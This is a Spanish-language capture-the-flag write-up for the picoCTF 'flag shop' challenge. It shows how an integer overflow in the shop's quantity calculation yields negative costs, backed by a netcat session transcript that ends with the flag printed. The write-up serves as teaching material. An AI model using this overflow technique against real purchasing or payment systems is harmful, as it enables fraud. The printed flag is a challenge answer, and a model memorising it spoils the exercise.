## Descripción 
There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c). Connect with `nc jupiter.challenges.picoctf.org 4906`.

Hint:
1. Two's compliment can do some weird things when numbers get really big!
## Solución 1

Nos conectamos al servidor usando netcat. Al principio, no teníamos suficiente dinero para comprar la bandera especial que costaba mucho. Descargamos y miramos el archivo store.c y miramos que en el código hay un efecto de overflow o desbordamiento. Entonces investigamos cual es el número entero máximo que un entero en c puede representar que es 2147483647. Nos damos cuenta que el número se desborda volviéndose negativo y dándonos una suma a nuestro balance. Cuando cambiamos los números para que estemos más abajo de este máximo por ejemplo 2147483610 más negativo se vuelve el número por ende nos dan más dinero, repetimos este proceso hasta que tengamos el dinero suficiente para comprar la bandera.

```
omarsalazar@DESKTOP-H97NF1C:~$ nc jupiter.challenges.picoctf.org 4906
Welcome to the flag exchange
We sell flags

2. Check Account Balance

3. Buy Flags

4. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2147483647

The final cost is: -900

Your current balance after transaction: 2000

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2147483647

The final cost is: -900

Your current balance after transaction: 2900

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2147483646

The final cost is: -1800

Your current balance after transaction: 4700

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2147483610

The final cost is: -34200

Your current balance after transaction: 38900

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2147483111

The final cost is: -483300

Your current balance after transaction: 522200

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b}
Welcome to the flag exchange
We sell flags

3. Check Account Balance

4. Buy Flags

5. Exit

 Enter a menu selection
 
flag: picoCTF{m0n3y_bag5_9c5fac9b}

```

## Referencias 
https://learn.microsoft.com/en-us/cpp/c-language/cpp-integer-limits?view=msvc-170